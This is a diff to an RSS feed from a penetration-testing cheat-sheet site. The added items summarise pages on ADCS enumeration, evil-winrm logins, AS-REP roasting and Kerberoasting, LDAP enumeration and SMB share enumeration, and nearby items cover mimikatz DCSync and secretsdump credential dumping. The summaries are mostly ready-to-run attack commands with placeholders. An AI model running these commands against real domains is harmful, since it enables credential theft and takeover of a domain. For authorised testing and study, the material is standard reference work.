@@ -15,6 +15,27 @@
       <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID .\mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain .\mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4.</description>
     </item>
     <item>
+      <title>ADCS</title>
+      <link>https://tldrbins.github.io/adcs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/adcs/</guid>
+      <description>Enum (From Linux) certipy-ad nxc certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser # Import ADCSTemplate module import-module .</description>
+    </item>
+    <item>
+      <title>evil-winrm</title>
+      <link>https://tldrbins.github.io/evil-winrm/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/evil-winrm/</guid>
+      <description>Connection Methods Password Hash Kerberos crt &amp; key evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; # Step 1: Edit &amp;#39;/etc/krb5.conf&amp;#39; (All in uppercase) [libdefaults] default_realm = &amp;lt;DOMAIN&amp;gt; [realms] &amp;lt;DOMAIN&amp;gt; = { kdc = &amp;lt;DC&amp;gt;:88 admin_server = &amp;lt;DC&amp;gt; default_domain = &amp;lt;DOMAIN&amp;gt; } [domain_realm] .domain.internal = &amp;lt;DOMAIN&amp;gt; domain.internal = &amp;lt;DOMAIN&amp;gt; # Step 2: export .ccache export KRB5CCNAME=&amp;lt;CCACHE&amp;gt; # Step 3: Connect sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; evil-winrm -i &amp;lt;TARGET&amp;gt; -r &amp;lt;DC&amp;gt; evil-winrm -i &amp;lt;TARGET&amp;gt; -S -k auth.</description>
+    </item>
+    <item>
+      <title>Kerberoasting</title>
+      <link>https://tldrbins.github.io/roasting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/roasting/</guid>
+      <description>AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile &amp;lt;USERS_FILE&amp;gt; -no-pass -dc-ip &amp;lt;DC&amp;gt; # Single user without creds impacket-GetNPUsers -no-pass -dc-ip &amp;lt;TARGET&amp;gt; &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; # Multiple valid usernames nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USERS_FILE&amp;gt; -p &amp;#39;&amp;#39; --asreproast as_rep_hashes.txt Kerberoasting (From Linux) Impacket nxc # Fix time skew sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -request &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; Note: Times skew have to be within 5 minutes in kerberos&#xA;# Kerberoasting without cred sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -no-preauth &amp;lt;USER_WITH_DONT_REQUIRE_PREAUTH&amp;gt; -usersfile &amp;lt;USERS_FILE&amp;gt; -dc-host &amp;lt;DC_IP&amp;gt; &amp;lt;DOMAIN&amp;gt;/ nxc ldap &amp;lt;DC_IP&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --kerberoasting kerberoast_hashes.</description>
+    </item>
+    <item>
       <title>Kerberos</title>
       <link>https://tldrbins.github.io/kerberos/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -22,11 +43,25 @@
       <description>Users enum kerbrute kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; &amp;lt;USERNAMES_FILE&amp;gt; Ref: kerbrute&#xA;Usernames generator username-anarchy ./username-anarchy -i &amp;lt;USERS_FILE&amp;gt; | tee &amp;lt;USERNAMES_FILE&amp;gt; Ref: username-anarchy&#xA;Generate Kerberos ticket (From Linux) Kinit Impacket 1. Set up # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) &amp;lt;TARGET&amp;gt; &amp;lt;DC&amp;gt; &amp;lt;DOMAIN&amp;gt; # Step 2: Add domain controller as a DNS server to &amp;#39;/etc/resolv.</description>
     </item>
     <item>
+      <title>LDAP</title>
+      <link>https://tldrbins.github.io/ldap/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ldap/</guid>
+      <description>Enum ldapsearch ldapdomaindump nmap # Get domain base ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -D &amp;#34;CN=&amp;lt;USER&amp;gt;,CN=Users,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#34; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # With creds ldapdomaindump -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -o ./ldap # Using nmap script sudo nmap -p 389 --script ldap-search &amp;lt;TARGET&amp;gt; Enum with Kerberos ldapsearch nxc # Add GSSAPI sudo apt install libsasl2-modules-gssapi-mit ldapsearch -H ldap://&amp;lt;TARGET&amp;gt; -Y GSSAPI -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # With kerberos nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --users </description>
+    </item>
+    <item>
       <title>Machine Account</title>
       <link>https://tldrbins.github.io/machine_account/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/machine_account/</guid>
       <description>Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt 2. Secrets Dump Linux Windows 1. Convert kirbi to ccache python3 rubeustoccache.py &amp;lt;BASE64_TICKET&amp;gt; secrets.kirbi secrets.ccache 2. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass -just-dc-user administrator Ref: RubeusToCcache&#xA;1. TO-DO TO-DO </description>
+    </item>
+    <item>
+      <title>SMB Enum</title>
+      <link>https://tldrbins.github.io/smb_enum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/smb_enum/</guid>
+      <description>SMB Share Enum nmap sudo nmap --script=smb-enum-shares -p 445 &amp;lt;TARGET&amp;gt; Anonymous Login smbmap smbclient impacket smbmap -H &amp;lt;TARGET&amp;gt; --no-banner smbmap -H &amp;lt;TARGET&amp;gt; -u null --no-banner # List known share smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ # After found an accessible share smbclient -N \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ --option=&amp;#39;client min protocol=NT1&amp;#39; # SID brute, if null auth allowed impacket-lookupsid test@&amp;lt;DOMAIN&amp;gt; -no-pass Authenticated smbmap smbclient smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # List known share smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -R &amp;lt;SHARE&amp;gt; # Download file smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; --download &amp;lt;PATH_TO_FILE&amp;gt; # List files with regex pattern smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -r &amp;lt;SHARE&amp;gt; -A &amp;lt;FILE_PATTERN&amp;gt; smbclient -L \\\\&amp;lt;TARGET&amp;gt;\\ -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; # After found an accessible share smbclient \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; Authenticated with Kerberos impacket impacket-smbclient &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; -k -no-pass Basic commands # List all files in a share recurse ON ls # Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * List Alternate Data Streams (ADS) allinfo &amp;lt;FILE&amp;gt; # Example Response &amp;gt;&amp;gt;&amp;gt;stream: [:Password:$DATA], 15 bytes # Download specific data stream get &amp;#34;&amp;lt;FILE&amp;gt;:Password&amp;#34; Mount SMB Share Anonymous Authenticated sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt sudo mount -t cifs -o ro,user=&amp;lt;USER&amp;gt;,password=&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt Check write permission sudo find .</description>
     </item>
     <item>
       <title>Winrm from Windows VM</title>
